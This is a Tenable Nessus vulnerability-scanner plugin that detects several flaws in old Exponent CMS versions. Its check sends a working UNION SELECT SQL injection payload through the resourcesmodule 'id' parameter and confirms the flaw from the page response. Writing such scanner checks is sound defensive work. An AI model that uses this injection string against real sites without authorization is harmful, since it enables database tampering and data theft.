#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20211);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2005-3762", "CVE-2005-3763", "CVE-2005-3764", "CVE-2005-3765", "CVE-2005-3766", "CVE-2005-3767");
  script_bugtraq_id(15389, 15391, 15503);
  script_osvdb_id(20790, 21023, 21024, 21025, 21026, 21027);

  script_name(english:"Exponent CMS < 0.96.4 Multiple Remote Vulnerabilities (XSS, SQLi, Code Exe, Disc)");
  script_summary(english:"Checks for multiple vulnerabilities in Exponent CMS < 0.96.4");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Exponent CMS, an open source content
management system written in PHP. 

The version of Exponent CMS installed on the remote host fails to
sanitize input to the 'id' parameter of the resource module before
using it in database queries.  An unauthenticated attacker can exploit
this issue to manipulate SQL queries regardless of the setting of
PHP's 'magic_quotes_gpc' variable. 

The application also reportedly fails to sanitize input to the
'parent' module of the navigation module before using that in database
queries if the user is authenticated and acting as an admin and may
allow an authenticated user to upload files with arbitrary PHP code
through its image upload facility and then execute that code on the
remote host subject to the permissions of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b4ccf762" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/tracker/index.php?func=detail&aid=1230208&group_id=118524&atid=681366" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/tracker/index.php?func=detail&aid=1230221&group_id=118524&atid=681366" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/tracker/index.php?func=detail&aid=1353361&group_id=118524&atid=681366" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/417218" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Exponent CMS version 0.96.4 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/11/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/11/19");
 script_cvs_date("$Date: 2015/02/03 17:40:02 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded:0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/exponent", "/site", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit one of the SQL injection flaws.
  exploit = string(
    # fields from exponent_resourceitem table included by default.
    "UNION SELECT ",
      # id
      "-1,",
      # name
      "'", SCRIPT_NAME, "',",
      # description
      "'Nessus test',",
      # location_data
      "'", 'O:8:"stdClass":3:{s:3:"mod";s:15:"resourcesmodule";s:3:"src";s:20:"@random41940ceb78dbb";s:3:"int";s:0:"";}', "',",
      # file_id - nb: this must exist in exponent_file; 
      #           7 => "files/resourcesmodule/@random41940ceb78dbb"
      "7,",
      # flock_owner - nb: leave 0.
      "0,",
      # approved
      "0,",
      # posted
      "0,",
      # poster
      "0,",
      # edited
      "0,",
      # editor
      "0",
    " --"
  );
  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "action=view&",
      "module=resourcesmodule&",
      "id=", urlencode(str:string("0 ", exploit))
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # it looks like Exponent and...
    '<meta name="Generator" content="Exponent Content Management System" />' >< res &&
    # the name field from our request was accepted.
    string("<b>", SCRIPT_NAME, "</b><br />") >< res
  ) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
